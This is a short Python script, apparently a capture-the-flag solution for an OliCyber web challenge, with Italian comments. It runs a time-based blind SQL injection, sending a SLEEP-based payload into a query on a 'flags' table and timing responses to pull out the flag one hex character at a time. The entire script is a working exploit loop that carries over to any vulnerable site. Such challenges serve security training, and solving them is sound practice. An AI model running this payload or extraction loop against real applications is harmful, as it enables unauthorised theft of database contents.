from sqlinjection import Inj
from time import time

inj = Inj('http://web-17.challs.olicyber.it')

dictionary = '0123456789abcdef'
result = ''

while True:
    for c in dictionary:
        question = f"1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{result+c}%')='1"
        start = time()
        inj.time(question)
        elapsed = time() - start
        print(c + ": " + str(elapsed))

        if elapsed > 1:
            # match!
            result += c
            print(result)
            break
    else:
        break # Yup, i cicli for in Python hanno una sezione else.
              # Significa che abbiamo esaurito i caratteri del
              # dizionario.

bytes = bytes.fromhex(result)
print(bytes.decode('utf-8'))

